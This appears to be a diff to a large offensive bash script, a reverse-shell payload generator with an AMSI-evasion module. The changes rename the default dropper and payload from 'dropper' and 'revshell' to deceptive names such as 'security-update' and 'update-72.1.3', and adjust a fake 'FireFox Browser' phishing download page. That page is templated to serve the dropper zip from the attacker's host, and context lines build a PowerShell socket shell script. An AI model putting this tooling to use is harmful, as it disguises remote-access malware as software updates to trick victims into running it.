@@ -11995,14 +11995,15 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.1.3\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="dropper";fi
-if [ -z "$NaM" ]; then NaM="revshell";fi
+if [ -z "$Drop" ]; then Drop="update-72.1.3";fi
+if [ -z "$NaM" ]; then NaM="security-update";fi
 
 # display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
@@ -12056,7 +12057,7 @@ echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1
 
 ## Building Download webpage
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.0.3" --width 350 --height 200) > /dev/null 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.1.3" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
     cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
@@ -12140,8 +12141,8 @@ sleep 2
 
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: revshell" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.1.3\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
@@ -12149,9 +12150,9 @@ rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$NaM" ]; then NaM="revshell";fi
+if [ -z "$NaM" ]; then NaM="security-update";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$Drop" ]; then Drop="dropper";fi
+if [ -z "$Drop" ]; then Drop="update-72.1.3";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 
 
@@ -12222,7 +12223,7 @@ cd $IPATH
 
 ## Building Download webpage
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.0.3" --width 350 --height 200) > /dev/null 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.1.3" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
     cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
@@ -12303,13 +12304,13 @@ sleep 2
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: security-update\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
-Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.0.3\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: update-72.1.3\nWarning: Dont start FileName with [f|v|t|r]" --entry --width 300) > /dev/null 2>&1
 rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$Drop" ]; then Drop="update-72.0.3";fi
+if [ -z "$Drop" ]; then Drop="update-72.1.3";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$NaM" ]; then NaM="security-update";fi
 
@@ -12364,7 +12365,7 @@ echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\
 
 ## Building Download webpage
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
-phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.0.3" --width 350 --height 200) > /dev/null 2>&1
+phish=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Download Pages:" --radiolist --column "Pick" --column "Option" FALSE "Mega-Upload (default)" TRUE "FireFox Browser 72.1.3" --width 350 --height 200) > /dev/null 2>&1
 if [ "$phish" = "Mega-Upload (default)" ]; then
     cd $IPATH/templates/phishing
    sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
